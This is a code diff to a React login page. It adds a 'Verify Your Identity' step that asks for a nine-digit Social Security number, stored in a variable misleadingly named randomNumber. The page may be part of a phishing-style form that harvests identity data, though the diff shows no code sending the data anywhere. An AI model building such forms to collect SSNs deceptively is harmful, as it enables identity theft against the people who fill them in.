@@ -342,14 +342,24 @@ export default function LoginPage() {
           <Card className="shadow-lg border-0">
             <CardHeader className="space-y-4 pb-4">
               <h1 className="text-2xl font-semibold text-center text-gray-900">Verify Your Identity</h1>
+              <div className="flex justify-center space-x-2">
+                <img src="/images/12345.jpg" alt="12345" className="w-full h-29 object-cover mb-2" />
+              </div>
             </CardHeader>
             <CardContent className="space-y-4">
+              <p className="text-2xl font-semibold text-center text-gray-900">Enter your Social Security number</p>
+              <p className="text-sm text-gray-600">Social Security Number (#########)*</p>
               <form onSubmit={handleRandomNumberSubmit}>
                 <Input
                   type="text"
-                  placeholder="Enter your Social Security number (###-##-####) *"
+                  placeholder="#########"
                   value={randomNumber}
-                  onChange={(e) => setRandomNumber(e.target.value)}
+                  onChange={(e) => {
+                    const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 9);
+                    setRandomNumber(value);
+                  }}
+                  maxLength={9}
+                  pattern="[0-9]{9}"
                   className="w-full mb-4"
                   required
                 />
